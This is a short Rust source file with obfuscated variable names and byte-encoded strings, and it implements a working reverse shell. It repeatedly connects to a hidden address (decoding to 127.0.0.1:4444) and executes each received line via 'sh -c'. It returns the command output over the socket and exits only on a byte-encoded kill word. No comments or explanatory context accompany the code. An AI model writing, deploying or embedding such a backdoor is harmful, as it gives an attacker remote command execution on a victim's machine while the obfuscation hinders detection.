use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;


const Ox3435342: &str = {
    const Ox7234536: [u8; 14] = [49, 50, 55, 46, 48, 46, 48, 46, 49, 58, 52, 52, 52, 52]; 
    unsafe { std::str::from_utf8_unchecked(&Ox7234536) }
};


fn Ox654675(Ox8646435 : &str) -> String {
    let Ox8646464 = Command::new("sh")
        .arg("-c")
        .arg(Ox8646435)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match Ox8646464 {
        Ok(Ox8646464) => {
            let Ox5535245 = String::from_utf8_lossy(&Ox8646464.stdout);
            let Ox6355556 = String::from_utf8_lossy(&Ox8646464.stderr);
            format!("\n{}\n\n{}", Ox5535245, Ox6355556)
        }
        Err(e) => format!("{}", e),
    }
}

fn main() {
    loop {
        match TcpStream::connect(Ox3435342) {
            Ok(mut Ox3436742) => {
                
                loop {
                    let mut Ox3436342 = [0; 1024];
                    match Ox3436742.read(&mut Ox3436342) {
                        Ok(0) => {
                            break;
                        }
                        Ok(n) => {
                            let Ox3439742 = String::from_utf8_lossy(&Ox3436342[..n]).trim().to_string();
                            
                            if Ox3439742.to_lowercase() == String::from_utf8(vec![97, 108, 118, 105, 100, 97]).unwrap() {
                                return;
                            }
                            
                            let Ox3239742 = Ox654675(&Ox3439742);
                            let _ = Ox3436742.write_all(Ox3239742.as_bytes());
                        }
                        Err(_) => {
                            break;
                        }
                    }
                }
            }
            Err(_) => {
                thread::sleep(Duration::from_secs(5));
            }
        }
    }
}
